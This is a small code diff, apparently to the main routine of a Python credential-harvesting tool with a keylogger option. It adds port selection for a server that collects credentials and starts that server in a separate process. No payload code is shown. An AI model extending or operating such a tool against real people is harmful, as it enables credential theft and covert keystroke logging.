@@ -28,14 +28,15 @@ if __name__ == "__main__":
         
         keyloggerprompt()
         addingkeylogger()
-       
         inputCustom()
-        ##############
-        runServer()
-        selectServer()
+        port = selectPort()
 
-        multiprocessing.Process(target=runServer).start()
-        getCredentials()
+        ##############
+        runServer(port)
+        selectServer(port)
+
+        multiprocessing.Process(target=runServer, args=(port,)).start()
+        getCredentials(port)
 
     except KeyboardInterrupt:
         endMessage()
